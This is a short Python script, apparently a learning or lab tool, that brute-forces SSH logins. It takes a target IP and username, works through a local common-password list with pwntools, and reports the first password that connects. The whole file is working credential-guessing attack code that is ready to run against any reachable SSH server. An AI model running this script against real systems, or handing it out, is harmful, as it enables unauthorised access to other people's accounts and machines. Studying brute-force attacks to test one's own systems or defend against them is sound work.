from pwn import *
import paramiko

#Allows user to input ip address and username of the target.
host=input("enter the IP address to be tested: ") 
username=input(str("Please enter a username: "))
attempt=0
#This loops opens commonPasswords.txt file and indexes through every password in it.
with open("Brute force/commonPasswords.txt", 'r') as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: {}".format(attempt,password))
            response = ssh(host=host, user=username, password=password) #this line sends a ssh request to the target.
            if response.connected():
                print("[>] Valid password found : '{}'".format(password))
                response.close() #this line closes the connection if successful.
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException: #this exception lets the code to keep running if the password is invalid.
            print("[X] Invalid password!")
        attempt+= 1
#REMEMBER YOU CAN ADD ANY PASSWORD TO commonPasswords.txt